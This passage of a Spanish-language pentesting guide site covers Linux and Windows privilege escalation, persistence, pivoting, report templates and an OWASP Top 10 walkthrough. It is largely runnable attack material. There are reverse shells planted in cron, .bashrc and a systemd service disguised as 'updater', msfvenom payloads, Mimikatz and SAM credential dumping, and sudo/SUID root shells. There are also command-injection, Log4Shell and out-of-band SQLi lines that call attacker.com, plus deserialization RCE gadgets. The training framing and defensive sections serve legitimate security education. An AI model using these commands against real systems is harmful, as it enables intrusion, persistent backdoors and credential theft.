perl linux-exploit-suggester-2.pl

# ============ VECTORES COMUNES DE ESCALADO ============

# 1. SUDO — qué puedes ejecutar
sudo -l
# Si ves comandos sin password:
sudo /usr/bin/vim -c ':!/bin/bash'
sudo /usr/bin/less /etc/shadow
sudo /usr/bin/python -c 'import os; os.system("/bin/bash")'
sudo /usr/bin/find / -exec /bin/sh \;
sudo /usr/bin/awk 'BEGIN {system("/bin/bash")}'
# GTFO Bins — referencia: gtfobins.github.io

# 2. SUID binaries
find / -perm -4000 -type f 2>/dev/null
# Buscar en gtfobins.github.io el binario correspondiente
/usr/bin/pkexec  # CVE-2021-4034 (PwnKit)
/usr/bin/nmap --interactive
nmap> !bash

# 3. Kernel exploits
uname -a
# CVE-2021-4034 (PwnKit) — afecta a pkexec en casi todas las distros
git clone https://github.com/berdav/CVE-2021-4034
cd CVE-2021-4034 && make && ./cve-2021-4034

# CVE-2023-2640 / CVE-2023-3269 (Ubuntu Privilege Escalation)
# CVE-2022-0847 (Dirty Pipe) — kernel 5.8+

# 4. Cron jobs
cat /etc/crontab
ls -la /etc/cron*
# Si un script se ejecuta como root y es writeable:
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' >> /ruta/al/script.sh

# 5. Capacidades (capabilities)
getcap -r / 2>/dev/null
# cap_setuid+ep en python:
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# 6. NFS (Network File System)
cat /etc/exports
# Si ves /dir *(rw,no_root_squash) — puedes acceder como root
mount -t nfs target:/dir /mnt
cp /bin/bash /mnt/bash && chmod +s /mnt/bash

# 7. LXD/LXC (si el usuario está en el grupo lxd)
lxd init
lxc image import ubuntu.tar.gz --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root
lxc start privesc
lxc exec privesc /bin/sh
ls /mnt/root/root/</code></pre>

<h4>4.2 Escalado de Privilegios Windows</h4>
<pre><code class="language-bash"># ============ ENUMERACIÓN AUTOMÁTICA ============
# WinPEAS
winpeas.exe > winpeas_output.txt
# PowerUp
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks"
# JAWS
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1')"

# ============ VECTORES COMUNES ============

# 1. Modificar servicios
accesschk.exe -uwcqv "Authenticated Users" *
sc qc servicio
sc config servicio binpath="cmd /c net localgroup Administrators user /add"
sc start servicio

# 2. Unquoted Service Paths
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows"
# Si el path tiene espacios sin comillas, puedes poner un ejecutable

# 3. AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Si ambos son 1, puedes instalar .msi como admin
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f msi > evil.msi
msiexec /quiet /qn /i evil.msi

# 4. Token Privileges (SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege)
# JuicyPotato, RoguePotato, PrintSpoofer, GodPotato, EfsPotato
PrintSpoofer.exe -i -c cmd

# 5. Mimikatz — dump de credenciales
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::cache
sekurlsa::tickets /export

# 6. SAM (Security Account Manager) — volcar hashes locales
# Desde cmd como admin:
reg save hklm\sam sam.save
reg save hklm\system system.save
reg save hklm\security security.save
# Luego extraer hashes:
samdump2 system.save sam.save
impacket-secretsdump -sam sam.save -system system.save LOCAL</code></pre>

<h4>4.3 Persistencia</h4>
<pre><code class="language-bash"># LINUX — Persistencia
# 1. SSH authorized_keys
mkdir -p ~/.ssh && echo "ssh-rsa AAA..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
# 2. Cron reverse shell
(crontab -l 2>/dev/null; echo "*/5 * * * * bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'") | crontab -
# 3. .bashrc / .bash_profile
echo '/bin/bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1 &"' >> ~/.bashrc
# 4. Service systemd
cat << 'EOF' > /etc/systemd/system/updater.service
[Unit]
Description=System Updater
[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
Restart=always
RestartSec=60
[Install]
WantedBy=multi-user.target
EOF
systemctl enable updater && systemctl start updater

# WINDOWS — Persistencia
# 1. Registry Run Key
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\windows\temp\evil.exe"
# 2. Scheduled Task
schtasks /create /tn "Updater" /tr "C:\windows\temp\evil.exe" /sc onlogon /ru SYSTEM
# 3. WMI Event Subscription
# (más avanzado, apenas deja rastro en disco)
# 4. Service
sc create EvilService binPath="C:\windows\temp\evil.exe" start=auto</code></pre>

<h4>4.4 Movimiento Lateral (Pivoting)</h4>
<pre><code class="language-bash"># SSH Tunneling
# Local port forward: acceder a servicio interno desde tu máquina
ssh -L 8888:internal:80 user@target

# Remote port forward: exponer puerto local al target
ssh -R 8080:localhost:80 user@target

# Dynamic port forwarding (SOCKS proxy)
ssh -D 9050 user@target -f -N
# Ahora usa proxychains
proxychains nmap -sT -Pn 10.10.10.0/24

# Chisel — túnel TCP (no necesita SSH)
# Servidor (tu máquina):
./chisel server -p 8080 --reverse
# Cliente (target comprometido):
./chisel client tu_ip:8080 R:8888:localhost:8888

# Ligolo-ng — VPN-like pivoting (recomendado)
# En tu máquina: ligolo-proxy -selfcert
# En target: ligolo-agent -connect tu_ip:11601 -ignore-cert
# En proxy: session, ifconfig, start

# Metasploit pivoting
# En Meterpreter:
run autoroute -s 10.10.10.0/24
background
use auxiliary/server/socks_proxy
run
# Luego proxychains</code></pre>

<h3>📝 FASE 5: Reporte — Lo único que ve el cliente</h3>
<p>Un pentest sin reporte no vale nada. El reporte es el entregable principal. Dedícale tiempo y cuida la presentación.</p>

<h4>5.1 Estructura del reporte profesional</h4>
<pre><code class="language-text">1. PORTADA
   - Cliente, proyecto, fecha, clasificación
   - Pentesters, contactos

2. RESUMEN EJECUTIVO (máximo 1 página)
   - Lenguaje NO técnico (el CEO debe entenderlo)
   - Qué se hizo, cuándo, alcance
   - Estadísticas: N hallazgos (X críticos, Y altos, Z medios, W bajos)
   - Impacto potencial en negocio
   - Fortalezas encontradas (lo que hacen bien)

3. HALLAZGOS CRÍTICOS (si los hay)
   - Qué, dónde, impacto inmediato, remediación urgente

4. METODOLOGÍA
   - Estándar seguido (PTES, OWASP, NIST)
   - Herramientas utilizadas
   - Fases del pentest

5. HALLAZGOS DETALLADOS
   CADA HALLAZGO DEBE INCLUIR:
   - ID (F-001, F-002...)
   - Título descriptivo
   - Severidad (CVSS v3.1 score + rating)
   - CVSS Vector (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
   - Descripción técnica (en qué consiste la vulnerabilidad)
   - Pasos para reproducir (comandos, capturas)
   - PoC (Proof of Concept) — evidencia
   - Impacto potencial
   - Remedación (cómo arreglarlo, prioridad)
   - Referencias (CVE, CWE, OWASP, enlaces)

6. RECOMENDACIONES ESTRATÉGICAS
   - Quick wins (fáciles de arreglar, alto impacto)
   - Mejoras a medio plazo
   - Hoja de ruta de seguridad

7. ANEXOS
   - Lista completa de IPs/dominios escaneados
   - Fechas y horas de las pruebas
   - Comandos principales ejecutados
   - Glosario de términos técnicos
   - Metodología CVSS</code></pre>

<h4>5.2 Template de hallazgo</h4>
<pre><code class="language-text">=== F-001: SQL Injection en /api/users ===
Severidad: CRÍTICO (CVSS 9.8)
Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

Descripción:
Se detectó una vulnerabilidad de SQL Injection en el endpoint
GET /api/users?id=1. La aplicación no sanitiza el parámetro "id",
permitiendo a un atacante inyectar consultas SQL arbitrarias.

Pasos para reproducir:
1. GET /api/users?id=1' OR '1'='1' --
   → Devuelve TODOS los usuarios (debería devolver solo 1)
2. GET /api/users?id=1' UNION SELECT @@version,null --
   → Devuelve la versión de la base de datos

Evidencia:
[Captura de pantalla 1: petición normal]
[Captura de pantalla 2: petición maliciosa mostrando todos los usuarios]
[Captura de pantalla 3: extracción de versión de BD]

Impacto:
Un atacante podría extraer TODA la base de datos:
- Credenciales de usuarios (50k+ registros)
- Datos personales (nombres, emails, DNI)
- Tokens de autenticación
Potencial robo completo de la base de datos.

Remediación:
1. Usar consultas parametrizadas (prepared statements)
2. Validar que el parámetro "id" sea numérico
3. Aplicar principio de mínimo privilegio en BD
4. Implementar WAF (ModSecurity) como defensa adicional

Código vulnerable:
$query = "SELECT * FROM users WHERE id=" . $_GET['id'];

Código seguro:
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);

Referencias:
- CWE-89: SQL Injection
- OWASP A03: Injection
- https://portswigger.net/web-security/sql-injection</code></pre>

<h4>5.3 Herramientas para reportes</h4>
<ul>
<li><strong>Dradis:</strong> Plataforma colaborativa para reportes de seguridad</li>
<li><strong>Faraday:</strong> IDE para pentesters, integra herramientas y genera reportes</li>
<li><strong>Pwndoc:</strong> Open source, gestión de pentests y reportes</li>
<li><strong>CherryTree:</strong> Notas jerárquicas con formato (simple y efectivo)</li>
<li><strong>Markdown + PDF:</strong> Convierte a PDF profesional con pandoc o mkdocs</li>
<li><strong>Sysreptor:</strong> Plataforma online para reportes de pentesting (recomendada)</li>
</ul>

<div class="guide-callout goal"><strong>🎯 Objetivo cumplido:</strong> Has completado un pentest completo siguiendo la metodología PTES: desde el contrato inicial hasta la entrega del reporte. Ahora eres capaz de realizar pentests profesionales de principio a fin. Recuerda: la metodología y el reporte son más importantes que las herramientas.</div>
</div>`
    },
    {
      id: "owasp-top10",
      title: "OWASP Top 10 2021 — Guía Completa",
      subtitle: "Las 10 vulns web críticas en detalle",
      emoji: "🍳", category: "tecnicas", level: "Intermedio",
      elements: 200, estimatedReadTime: 55,
      tags: ["owasp", "web", "vulnerabilidades", "desarrollo-seguro", "A01-A10"],
      linkedArticles: [],
      description: "Las 10 vulnerabilidades web más críticas del OWASP Top 10 2021. Cada una con: descripción técnica, código vulnerable vs seguro, exploit paso a paso, defensa, CVE real y laboratorios para practicar.",
      content: `<div class="guide-content">
<div class="guide-callout goal"><strong>🎯 Objetivo:</strong> Dominar las 10 categorías del OWASP Top 10 2021. Cada vulnerabilidad se explica con código vulnerable y seguro, técnicas de explotación, defensas, CVEs reales y laboratorios donde practicar. Este conocimiento es la base de TODO profesional de seguridad web.</div>

<h3>A01: Broken Access Control — #1 del ranking</h3>
<p><strong>Presente en el 94% de las aplicaciones</strong> según el estudio de OWASP. Ocurre cuando un usuario puede acceder a recursos o funciones fuera de su permiso.</p>

<h4>1.1 IDOR (Insecure Direct Object Reference)</h4>
<p>Es la variante más común. El atacante modifica un identificador (ID) en la petición para acceder a datos de otro usuario.</p>

<pre><code class="language-http"># VULNERABLE: /api/users/12345/profile
GET /api/users/12345/profile HTTP/1.1
Cookie: session=abc123
# Si cambio 12345 a 12346 y sigo viendo datos -> IDOR

GET /api/users/12345/profile → 200 OK (datos de usuario 12345)
GET /api/users/12346/profile → 200 OK (datos de usuario 12346) ¡IDOR!

# IDOR en parámetros
GET /download?file=report_12345.pdf
GET /download?file=report_12346.pdf

# IDOR en POST
POST /api/transfer
{"from_account": "123", "to_account": "456", "amount": 1000}
# Cambiar "from_account" a otro número -> transferir desde cuenta ajena</code></pre>

<pre><code class="language-python"># VULNERABLE: confía en el ID de la URL
@app.route('/api/users/&lt;user_id&gt;/profile')
def get_profile(user_id):
    user = db.query(f"SELECT * FROM users WHERE id = {user_id}")
    return jsonify(user)

# SEGURO: verifica que el usuario autenticado es el propietario
@app.route('/api/users/&lt;user_id&gt;/profile')
def get_profile(user_id):
    if request.user.id != int(user_id):
        return abort(403)  # Forbidden
    user = db.query("SELECT * FROM users WHERE id = ?", (user_id,))
    return jsonify(user)</code></pre>

<h4>1.2 Path Traversal</h4>
<pre><code class="language-http">GET /download?file=../../etc/passwd HTTP/1.1
GET /download?file=../../windows/system32/config/sam HTTP/1.1
GET /download?file=....//....//....//etc/passwd   # bypass de sanitización simple
GET /download?file=..;/..;/..;/etc/passwd          # bypass (Windows)
GET /download?file=%2e%2e%2f%2e%2e%2fetc/passwd   # URL encoding</code></pre>

<pre><code class="language-python"># VULNERABLE
file = request.args.get('file')
with open(f'/var/www/files/{file}', 'r') as f:
    return f.read()

# SEGURO
import os
BASE_DIR = '/var/www/files/'
file = request.args.get('file')
# Sanitizar: eliminar ".." y "/"
file = file.replace('..', '').replace('/', '')
full_path = os.path.normpath(os.path.join(BASE_DIR, file))
if not full_path.startswith(BASE_DIR):
    return abort(403)
with open(full_path, 'r') as f:
    return f.read()</code></pre>

<h4>1.3 Defensa contra Broken Access Control</h4>
<ul>
<li><strong>Principio de mínimo privilegio:</strong> Cada usuario debe tener SOLO los permisos que necesita</li>
<li><strong>Validación en backend:</strong> NUNCA confíes en el frontend para restringir acceso</li>
<li><strong>Denegar por defecto:</strong> Si no está explícitamente permitido, está denegado</li>
<li><strong>UUIDs no secuenciales:</strong> Usa UUIDs en vez de IDs numéricos incrementales</li>
<li><strong>Auditoría:</strong> Registra todos los accesos denegados (logging)</li>
<li><strong>Rate limiting:</strong> Limita peticiones para prevenir enumeración</li>
</ul>

<p><strong>Laboratorios:</strong> PortSwigger: "Access control vulnerabilities" (10 labs)</p>

<h3>A02: Cryptographic Failures</h3>
<p>Antes llamado "Sensitive Data Exposure". Datos sensibles mal protegidos por criptografía débil o ausente.</p>

<h4>2.1 Ejemplos comunes</h4>
<ul>
<li>Contraseñas en texto plano en la base de datos</li>
<li>HTTP en vez de HTTPS en toda la aplicación</li>
<li>Cookies sin flags Secure, HttpOnly, SameSite</li>
<li>Números de tarjeta, DNI, emails en URLs (GET parameters)</li>
<li>Tokens JWT sin firmar (alg: "none") o con secret débil</li>
<li>Hashes MD5/SHA1 para contraseñas</li>
<li>Algoritmos de cifrado débiles (DES, RC4, ECB mode)</li>
<li>Números de tarjeta mostrados completos en pantalla</li>
</ul>

<h4>2.2 Cifrado de contraseñas</h4>
<pre><code class="language-python"># MALO - NUNCA hagas esto
import hashlib
hashlib.md5(password.encode()).hexdigest()     # 🔴 ROTO
hashlib.sha1(password.encode()).hexdigest()    # 🔴 ROTO

# REGULAR - mejor pero no recomendado
hashlib.sha256(password.encode()).hexdigest()  # 🟡 Rápido, crackeable con GPU

# BUENO - lo que DEBES usar
import bcrypt
bcrypt.hashpw(password.encode(), bcrypt.gensalt())  # 🟢 Seguro

# MEJOR - el estándar actual
from argon2 import PasswordHasher
ph = PasswordHasher()
ph.hash(password)  # 🟢 Más seguro (ganador Password Hashing Competition)</code></pre>

<h4>2.3 TLS/HTTPS misconfigurations</h4>
<pre><code class="language-bash"># Verificar configuración TLS
testssl.sh https://target.com

# Cabeceras de seguridad que DEBES tener
curl -sI https://target.com | grep -iE "strict-transport|x-frame|x-xss|content-security"

# Strict-Transport-Security (HSTS)
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# Content-Security-Policy (CSP)
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'

# X-Frame-Options
X-Frame-Options: DENY

# X-Content-Type-Options
X-Content-Type-Options: nosniff</code></pre>

<h4>2.4 JWT (JSON Web Tokens) inseguros</h4>
<pre><code class="language-bash"># Algoritmo "none" — atacante modifica el token
# Original: eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.xxxx
# Modificado: eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
# Herramientas: jwt_tool, john-jwt

# Fuerza bruta de secret débil
python jwt_tool.py token.txt -C -d rockyou.txt

# Ataques comunes JWT:
# - Algoritmo none
# - Debinilitación de algoritmo (RS256 -> HS256)
# - Secret débil
# - JWK injection
# - Kid (key ID) injection</code></pre>

<h4>2.5 Defensa contra Cryptographic Failures</h4>
<ul>
<li>HTTPS obligatorio (HSTS + redirect automático HTTP→HTTPS)</li>
<li>Cifrar datos sensibles en reposo (AES-256-GCM) y en tránsito (TLS 1.3)</li>
<li>Hashes de contraseñas: argon2 o bcrypt (NUNCA MD5, SHA1, SHA256 simple)</li>
<li>Cookies con Secure + HttpOnly + SameSite=Lax/Strict</li>
<li>JWT: secret fuerte (>256 bits), algoritmo HS256 o RS256, corta expiración</li>
<li>No exponer datos sensibles en URLs, logs, o respuestas de error</li>
</ul>

<p><strong>Laboratorios:</strong> PortSwigger: "Cryptographic failures" labs</p>

<h3>A03: Injection</h3>
<p>Cuando datos no confiables se envían a un intérprete como parte de un comando o consulta. La más conocida es SQL Injection.</p>

<h4>3.1 SQL Injection (SQLi)</h4>

<h5>Tipos de SQLi</h5>
<pre><code class="language-sql">-- 1. IN-BAND SQLi (el atacante ve el resultado en la respuesta HTTP)
-- 1a. Error-based: errores de BD visibles en la respuesta
' AND 1=CAST((SELECT @@version) AS int) --

-- 1b. Union-based: combinar resultados con UNION
' UNION SELECT null, null, database() --
' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables --
' UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name='users' --
' UNION SELECT 1, concat(username,':',password), 3 FROM users --

-- 2. BLIND SQLi (no se ve el resultado directamente)
-- 2a. Boolean-based: preguntas verdadero/falso
' AND SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'a' --
' AND SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'b' --

-- 2b. Time-based: respuestas con delay
' OR IF(SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'a', SLEEP(3), 0) --
' OR (SELECT CASE WHEN SUBSTRING(password,1,1)='a' THEN pg_sleep(3) ELSE 0 END FROM users LIMIT 1) --

-- 3. OUT-OF-BAND SQLi (el atacante usa canal diferente)
' EXEC xp_dirtree '\\attacker.com\file' --  # MSSQL -> DNS exfiltration
LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.attacker.com\\test'))  # MySQL</code></pre>

<h5>SQLMap avanzado</h5>
<pre><code class="language-bash"># Niveles y riesgos
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3

# Bypass WAF
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,randomcase,between
sqlmap -u "http://target.com/page?id=1" --tamper=charencode,charunicodeencode

# Desde request file
sqlmap -r request.txt --batch

# Shell interactiva
sqlmap -u "http://target.com/page?id=1" --os-shell
sqlmap -u "http://target.com/page?id=1" --sql-shell

# Base de datos completa
sqlmap -u "http://target.com/page?id=1" --dump-all

# Con autenticación
sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123"

# Proxy (para ver tráfico con Burp)
sqlmap -u "http://target.com/page?id=1" --proxy="http://127.0.0.1:8080"</code></pre>

<h5>Código: vulnerable vs seguro</h5>
<pre><code class="language-php">// 🔴 VULNERABLE (PHP)
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = $id";
$result = mysqli_query($conn, $query);

// 🟢 SEGURO (Prepared Statement)
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $_GET['id']);
$stmt->execute();</code></pre>

<pre><code class="language-python"># 🔴 VULNERABLE (Python)
user = request.args.get('user')
cursor.execute(f"SELECT * FROM users WHERE username = '{user}'")

# 🟢 SEGURO (Parameterized query)
cursor.execute("SELECT * FROM users WHERE username = ?", (user,))</code></pre>

<pre><code class="language-java">// 🔴 VULNERABLE (Java/JDBC)
String query = "SELECT * FROM users WHERE id = " + request.getParameter("id");
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(query);

// 🟢 SEGURO (PreparedStatement)
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
stmt.setInt(1, Integer.parseInt(request.getParameter("id")));
ResultSet rs = stmt.executeQuery();</code></pre>

<h4>3.2 Command Injection</h4>
<pre><code class="language-bash"># Vulnerable: app ejecuta ping con input del usuario
# Input: 8.8.8.8
ping -c 4 8.8.8.8              # normal
# Input malicioso: 8.8.8.8; id
ping -c 4 8.8.8.8; id           # COMMAND INJECTION

# Payloads comunes
; id
| id
|| id
&& id
\`id\`
$(id)
; nc -e /bin/bash attacker.com 4444
| bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'</code></pre>

<h4>3.3 Defensa contra Injection</h4>
<ul>
<li><strong>Prepared statements / Parameterized queries</strong> — SIEMPRE para SQL</li>
<li><strong>ORM</strong> (SQLAlchemy, Hibernate, Entity Framework) con consultas seguras</li>
<li><strong>Input validation:</strong> Whitelist de valores permitidos, tipos esperados</li>
<li><strong>Escaping / Encoding:</strong> Para contextos específicos (HTML escape, SQL escape)</li>
<li><strong>Principio de mínimo privilegio:</strong> La BD debe tener solo los permisos necesarios</li>
<li><strong>WAF:</strong> ModSecurity como defensa adicional (no como única)</li>
</ul>

<p><strong>Laboratorios:</strong> PortSwigger: "SQL injection" (18 labs), "Command injection" (5 labs)</p>

<h3>A04: Insecure Design</h3>
<p>Fallos en la arquitectura y diseño de la aplicación. No se arreglan con un parche o un WAF — requieren rediseño.</p>

<h4>4.1 Ejemplos</h4>
<ul>
<li><strong>Rate limiting ausente:</strong> El login no limita intentos → brute force ilimitado</li>
<li><strong>Reset de password inseguro:</strong> Pregunta de seguridad adivinable ("nombre de tu mascota")</li>
<li><strong>Confianza en el cliente:</strong> Precios, roles, descuentos enviados desde el frontend</li>
<li><strong>Falta de límites en APIs:</strong> Sin paginación, sin throttle → DoS o data exfiltration</li>
<li><strong>Procesos críticos sin confirmación:</strong> Transferencias, bajas, cambios de email sin verificación</li>
<li><strong>MFA ausente:</strong> Cuentas administrativas sin autenticación multifactor</li>
<li><strong>Falta de "defense in depth":</strong> Una sola capa de seguridad que si falla, todo falla</li>
</ul>

<h4>4.2 Ejemplo: Rate limiting</h4>
<pre><code class="language-python"># 🔴 VULNERABLE — sin rate limiting
@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form['user'], request.form['pass'])
    if user:
        return redirect('/dashboard')
    return render_template('login.html', error='Credenciales inválidas')

# 🟢 SEGURO — con rate limiting
from flask_limiter import Limiter
limiter = Limiter(key_func=lambda: request.remote_addr)

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")  # máximo 5 intentos por minuto
def login():
    user = authenticate(request.form['user'], request.form['pass'])
    if user:
        return redirect('/dashboard')
    return render_template('login.html', error='Credenciales inválidas')</code></pre>

<h4>4.3 Ejemplo: Confiar en el frontend</h4>
<pre><code class="language-http"># 🔴 VULNERABLE: el precio viene del frontend
POST /api/checkout HTTP/1.1
{"product_id": 123, "price": 100, "quantity": 1}

# 🟢 SEGURO: el precio se obtiene del backend
POST /api/checkout HTTP/1.1
{"product_id": 123, "quantity": 1}
# El servidor busca el precio en la BD</code></pre>

<h3>A05: Security Misconfiguration</h3>
<p>La vulnerabilidad más común en auditorías reales. Configuraciones inseguras por defecto, malas prácticas de hardening.</p>

<h4>5.1 Checklist de misconfiguraciones comunes</h4>
<ul>
<li>☐ Directorio listado en /images/, /uploads/, /backup/</li>
<li>☐ Paneles de admin en /admin, /wp-admin, /manager sin restricción IP</li>
<li>☐ Servidores sin hardening (Apache muestra versión, SSH permite root login)</li>
<li>☐ Métodos HTTP peligrosos habilitados (PUT, DELETE, TRACE, OPTIONS)</li>
<li>☐ Mensajes de error detallados (stack traces, SQL errors en producción)</li>
<li>☐ Debug mode activado en producción</li>
<li>☐ Bases de datos sin autenticación (MongoDB, Elasticsearch)</li>
<li>☐ CORS mal configurado (Access-Control-Allow-Origin: *)</li>
<li>☐ Aplicación muestra la versión exacta en errores 404</li>
<li>☐ Archivos sensibles accesibles (.env, .git/config, .htpasswd)</li>
<li>☐ Contenedores corriendo como root</li>
<li>☐ Buckets cloud públicos sin autenticación</li>
<li>☐ Certificados SSL caducados o autofirmados</li>
</ul>

<pre><code class="language-bash"># Buscar directorios abiertos (directory listing)
curl -s http://target.com/images/
curl -s http://target.com/backup/

# Detectar métodos HTTP
curl -X OPTIONS http://target.com -i | grep Allow

# Buscar archivos sensibles
curl -s http://target.com/.env
curl -s http://target.com/.git/config
curl -s http://target.com/robots.txt
curl -s http://target.com/sitemap.xml
curl -s http://target.com/crossdomain.xml
curl -s http://target.com/phpinfo.php

# Verificar cabeceras de seguridad
curl -sI https://target.com | grep -iE "server|x-powered|x-frame|content-sec|strict-trans"</code></pre>

<h3>A06: Vulnerable and Outdated Components</h3>
<p>Usar librerías, frameworks o software con CVES conocidos. Log4Shell (CVE-2021-44228) es el ejemplo más famoso reciente.</p>

<h4>6.1 Log4Shell (CVE-2021-44228)</h4>
<pre><code class="language-bash"># Exploit Log4j
curl -H 'User-Agent: \${jndi:ldap://attacker.com:1389/exploit}' https://target.com
curl -H 'X-Forwarded-For: \${jndi:ldap://attacker.com:1389/exploit}' https://target.com

# Detectar Log4j
nuclei -u https://target.com -t cves/2021/CVE-2021-44228.yaml
# Scanner específico
python log4j-scan.py -u https://target.com</code></pre>

<h4>6.2 Gestión de dependencias</h4>
<pre><code class="language-bash"># Escaneo de dependencias
npm audit                  # Node.js
pip audit && safety check  # Python
composer audit             # PHP
mvn dependency-check:check # Java
gem audit                  # Ruby

# Trivy — escáner universal
trivy fs --severity HIGH,CRITICAL .
trivy image nginx:latest
trivy repo https://github.com/org/repo

# OWASP Dependency Check — para proyectos Java/.NET
dependency-check.sh --project "My App" --scan .

# Dependabot (GitHub) — actualización automática de dependencias
# Snyk — escaneo continuo en CI/CD</code></pre>

<h4>6.3 Supply Chain Attacks — el nuevo frente</h4>
<ul>
<li><strong>event-stream (2018):</strong> Paquete npm con malware para robar bitcoins. 8 millones de descargas</li>
<li><strong>ua-parser-js (2021):</strong> Crypto-miner en paquete npm popular. 7 millones de descargas/semana</li>
<li><strong>colors.js + faker.js (2022):</strong> Desarrollador corrompió sus propios paquetes. Miles de proyectos afectados</li>
<li><strong>Defensa:</strong> Lock files (package-lock.json), verificar firmas, escaneo automático, mirror privado</li>
</ul>

<h3>A07: Identification and Authentication Failures</h3>
<p>Fallos en cómo la aplicación identifica, autentica y gestiona sesiones de usuarios.</p>

<h4>7.1 Problemas comunes</h4>
<ul>
<li><strong>Credenciales por defecto:</strong> admin:admin, root:toor, test:test123</li>
<li><strong>Enumeración de usuarios:</strong> "Usuario no encontrado" vs "Contraseña incorrecta"</li>
<li><strong>Brute force sin límite:</strong> Sin rate limiting, sin CAPTCHA</li>
<li><strong>Session fixation:</strong> El servidor acepta un session ID proporcionado por el atacante</li>
<li><strong>Sesión sin invalidar al logout:</strong> El session ID sigue siendo válido</li>
<li><strong>MFA ausente:</strong> Cuentas administrativas sin doble factor</li>
<li><strong>Contraseñas débiles:</strong> Sin política de complejidad (mínimo 8 chars, mayúsculas, números)</li>
<li><strong>Almacenamiento inseguro de sesiones:</strong> Session IDs en URLs, logs, o respuestas</li>
<li><strong>JWT inseguros:</strong> Algoritmo none, secret débil, larga expiración</li>
</ul>

<h4>7.2 Fuerza bruta con Hydra</h4>
<pre><code class="language-bash"># SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com

# HTTP POST form
hydra -l admin -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# FTP
hydra -l admin -P passwords.txt ftp://target.com

# SMTP
hydra -l admin -P passwords.txt smtp://target.com -V

# RDP
hydra -l administrator -P passwords.txt rdp://target.com

# Wordpress
wpscan --url https://target.com --passwords rockyou.txt --usernames admin</code></pre>

<h4>7.3 Defensa</h4>
<ul>
<li>Rate limiting en login y reset de password</li>
<li>Mensajes de error genéricos ("Credenciales inválidas")</li>
<li>MFA obligatorio para cuentas administrativas</li>
<li>Política de contraseñas fuerte (longitud mínima, complejidad, rotación)</li>
<li>Invalidar sesión al logout y al cambiar contraseña</li>
<li>Session IDs aleatorios, largos, HttpOnly, Secure, SameSite</li>
<li>No exponer session IDs en URLs</li>
<li>JWT: corta expiración (15-30 min), refresh tokens, secret fuerte</li>
</ul>

<h3>A08: Software and Data Integrity Failures</h3>
<p>Fallos en la integridad del software y los datos: actualizaciones sin verificar, deserialización insegura, CI/CD compromises.</p>

<h4>8.1 Deserialización Insegura</h4>
<pre><code class="language-php"># PHP — unserialize() PELIGROSO
class Evil {
    public $cmd = 'id';
    public function __destruct() {
        system($this->cmd);
    }
}
$payload = serialize(new Evil());
# Enviar: O:4:"Evil":1:{s:3:"cmd";s:2:"id";}
$data = unserialize($_GET['data']);  # EJECUTA 'id'
</code></pre>

<pre><code class="language-python"># Python — pickle inseguro
import pickle, os
class Evil(object):
    def __reduce__(self):
        return (os.system, ('id',))
payload = pickle.dumps(Evil())
# Enviar payload -> ejecuta 'id'</code></pre>

<pre><code class="language-java"># Java — readObject() inseguro
# Usando CommonsCollections1 gadget chain
java -jar ysoserial.jar CommonsCollections1 'id' > payload.bin
# Enviar payload binario -> deserialización -> RCE</code></pre>

<h4>8.2 Defensa</h4>
<ul>
<li>No deserializar datos de fuentes no confiables</li>
<li>Usar formatos de datos seguros (JSON, protobuf) en vez de serialización nativa</li>
<li>Firmar datos serializados con HMAC para verificar integridad</li>
<li>Mantener librerías actualizadas (gadget chains se parchan)</li>
<li>SBOM (Software Bill of Materials) para tracking de dependencias</li>
<li>Firmar artefactos con cosign/sigstore</li>
</ul>

<h3>A09: Security Logging and Monitoring Failures</h3>
